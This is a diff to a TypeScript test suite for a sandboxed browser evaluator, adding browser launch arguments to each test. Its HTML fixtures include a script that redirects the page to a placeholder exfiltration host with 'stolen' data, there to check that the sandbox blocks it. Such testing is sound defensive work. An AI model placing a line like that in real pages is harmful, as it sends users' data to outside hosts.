@@ -8,6 +8,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { chromium } from "playwright";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { gateBrowserArgs } from "../../tests/e2e/e2e-env";
 import { evaluateApp } from "./browser-eval";
 
 let outDir: string;
@@ -26,7 +27,7 @@ describe("evaluateApp (ruling 56)", () => {
 <button id="go">Go</button>
 <script>console.error("boom: something went wrong");</script>
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "console-error", outDir);
 			expect(result.consoleErrors.some((e) => e.includes("boom"))).toBe(true);
@@ -40,7 +41,7 @@ describe("evaluateApp (ruling 56)", () => {
 <button id="go">Go</button>
 <img src="https://example.invalid/should-be-blocked.png">
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(
 				browser,
@@ -72,7 +73,7 @@ describe("evaluateApp (ruling 56)", () => {
 <button id="go">Go</button>
 <script>location.href = "https://exfiltrate.invalid/?stolen=data";</script>
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "self-nav", outDir);
 			expect(
@@ -102,7 +103,7 @@ describe("evaluateApp (ruling 56)", () => {
   });
 </script>
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "confirm-dialog", outDir);
 			// No real dialog is ever shown (the sandbox suppresses it), so
@@ -132,7 +133,7 @@ describe("evaluateApp (ruling 56)", () => {
   });
 </script>
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "eval-blocked", outDir);
 			expect(result.consoleErrors.some((e) => e.includes("eval blocked"))).toBe(
@@ -152,7 +153,7 @@ describe("evaluateApp (ruling 56)", () => {
   });
 </script>
 </body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "storage-use", outDir);
 			// The smoke test clicks the one enabled button, which calls
@@ -169,7 +170,7 @@ describe("evaluateApp (ruling 56)", () => {
 
 	it("writes one screenshot per of the four page runs", async () => {
 		const html = `<!doctype html><html><body><p>hello</p></body></html>`;
-		const browser = await chromium.launch();
+		const browser = await chromium.launch({ args: gateBrowserArgs() });
 		try {
 			const result = await evaluateApp(browser, html, "screenshots", outDir);
 			expect(result.pages).toHaveLength(4);
